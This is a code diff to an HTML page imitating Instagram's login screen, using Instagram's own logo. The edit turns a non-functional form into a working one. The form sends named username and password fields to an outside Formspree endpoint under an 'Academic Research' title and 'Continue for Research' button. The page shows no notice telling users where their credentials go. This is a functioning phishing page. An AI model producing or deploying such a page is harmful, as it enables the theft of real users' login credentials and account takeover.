@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Instagram Clone - Educational</title>
+    <title>Instagram UI Clone - Academic Research</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -12,12 +12,25 @@
             height: 100vh;
             margin: 0;
         }
+        .research-notice {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #ffeb3b;
+            color: #d32f2f;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            z-index: 1000;
+        }
         .login-box {
             border: 1px solid #dbdbdb;
             background: white;
             padding: 20px 40px;
             text-align: center;
             max-width: 350px;
+            margin-top: 40px;
         }
         .logo {
             width: 175px;
@@ -41,45 +54,19 @@
             margin: 10px 0;
             font-weight: bold;
         }
-        .divider {
-            margin: 15px 0;
-            color: #8e8e8e;
-            display: flex;
-            align-items: center;
-        }
-        .line {
-            flex-grow: 1;
-            height: 1px;
-            background: #dbdbdb;
-        }
-        .text {
-            padding: 0 15px;
-        }
-        .fb-login {
-            color: #385185;
-            font-weight: bold;
-            margin: 15px 0;
-        }
     </style>
-</head>
+    </head>
 <body>
     <div class="login-box">
         <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
-        <form>
-            <form action="https://formspree.io/f/xzzrpldg" method="POST">
-            <input type="text" placeholder="Phone number, username, or email">
-            <input type="password" placeholder="Password">
-            <button type="button">Log In</button>
-        </form>
-        
-        <div class="divider">
-            <div class="line"></div>
-            <div class="text">OR</div>
-            <div class="line"></div>
-        </div>
-        
-        <div class="fb-login">Log in with Facebook</div>
-        <a href="#" style="color: #00376b; font-size: 12px;">Forgot password?</a>
+        <form action="https://formspree.io/f/xzzrpldg" method="POST">
+            <input type="text" name="research_username" placeholder="Test Username" required>
+            <input type="password" name="research_password" placeholder="Test Password">
+            <input type="hidden" name="_subject" value="Academic Research Submission">
+            <input type="hidden" name="_replyto" value="your_academic_email@university.edu">
+            
+            <button type="submit">Continue for Research</button>
+
     </div>
 </body>
 </html>
